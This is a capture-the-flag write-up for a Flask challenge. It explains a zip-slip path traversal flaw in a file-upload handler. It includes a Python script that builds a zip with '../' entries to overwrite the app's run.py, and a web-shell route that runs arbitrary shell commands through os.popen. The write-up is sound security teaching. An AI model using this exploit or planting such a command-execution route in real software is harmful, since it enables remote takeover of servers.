## Slippery Upload (Moderate)

As for most of these challenges viewing the Website gives us the source code. It's a Flask web app again.

```
from flask import Flask, request
import zipfile, os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32)
app.config['MAX_CONTENT_LENGTH'] = 1 * 1024 * 1024
app.config['UPLOAD_FOLDER'] = '/tmp/uploads/'

@app.route('/')
def source():
    return '

%s

' % open('/app/run.py').read()

def zip_extract(zarchive):
    with zipfile.ZipFile(zarchive, 'r') as z:
        for i in z.infolist():
            with open(os.path.join(app.config['UPLOAD_FOLDER'], i.filename), 'wb') as f:
                f.write(z.open(i.filename, 'r').read())

@app.route('/zip_upload', methods=['POST'])
def zip_upload():
    try:
        if request.files and 'zarchive' in request.files:
            zarchive = request.files['zarchive']
            if zarchive and '.' in zarchive.filename and zarchive.filename.rsplit('.', 1)[1].lower() == 'zip' and zarchive.content_type == 'application/octet-stream':
                zpath = os.path.join(app.config['UPLOAD_FOLDER'], '%s.zip' % os.urandom(8).hex())
                zarchive.save(zpath)
                zip_extract(zpath)
                return 'Zip archive uploaded and extracted!'
        return 'Only valid zip archives are acepted!'
    except:
         return 'Error occured during the zip upload process!'

if __name__ == '__main__':
    app.run()

```

We only have one endpoint that allows us to upload a zip file. The `zip_upload()` function contains some fluff to check if the uploaded file is actually a zip that good easily be bypassed but that isn't the bug here. 

If you have ever used pythons zipfile library you'll notice that the way this app extracts the zipfile is somewhat strange, it's not using the extract function and manully builds out the target path.
```
with open(os.path.join(app.config['UPLOAD_FOLDER'], i.filename), 'wb') as f
```
This line is the problem here. By using relative paths in the zip file it allows us to (over)write arbritary files on target system this. E.g. if we create a zip file with `../../etc/passwd` it will be extracted to `/tmp/uploads/../../etc/passwd`. 

Because normal zip programs prevent us from creating zip files containing files with these names a written some python code to do so.
```
from pyzip import PyZip
import sys

args = sys.argv

if len(args) != 2:
    print("Usage: " + args[0] + " <file>")
else:
    fileName = args[1]

    with open(fileName, "rb") as exploitFile:
        exploitFileBinary = bytearray(exploitFile.read())
    pyzip = PyZip({'../' * 2 + "app/" + fileName: exploitFileBinary})
    pyzip.save('exploit.zip')

    print('ZIP success')
```
We want code execution so an obvious candidate for a file to overwrite is `/app/run.py`. Upon overwriting this file with garbage the server responds with an error. Thats a good sign, it shows that the server is actually trying to execute the file we wrote.

We can now create our payload. Because it still needs to be a flask web app i took the original code and extended it with a route that executes shell commands and returns the result.

```
@app.route('/exec', methods=['GET'])
def exec():
    cmd = request.args['cmd']
    result = os.popen(cmd).read()
    return result
```
The flag was found in the same directory as the app.